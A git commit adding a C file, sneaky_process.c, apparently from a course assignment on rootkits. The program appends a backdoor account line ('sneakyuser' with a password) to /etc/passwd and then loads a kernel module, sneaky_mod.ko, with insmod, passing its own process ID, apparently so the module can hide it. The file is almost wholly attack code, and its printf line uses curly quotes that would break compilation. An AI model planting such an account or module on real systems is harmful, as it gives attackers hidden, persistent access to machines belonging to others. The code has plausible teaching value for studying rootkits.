0cd109104d1f5efff6882069859ddc268072f37d
zizhaofang <zizhao.fang@duke.edu>
2018-04-12 17:22:14 -0400

    s

---
+++ sneaky_process.c
@@ -0,0 +1,23 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <string.h>
+
+int main() {
+  //system("cp /etc/passwd /tmp/passwd");
+  FILE *f = fopen("/etc/passwd", "a");
+  if(f == NULL) {
+    perror("fopen:");
+  }
+  fprintf(f, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+  fclose(f);
+  pid_t mypid = getpid();
+  printf(“sneaky_process pid = %d\n”, mypid);
+  char command[50] = "insmod sneaky_mod.ko mypid=";
+  char cpid[10];
+  sprintf(cpid, "%d", mypid);
+  strcat(command, cpid);
+  system(command);
+  return 0;
+}
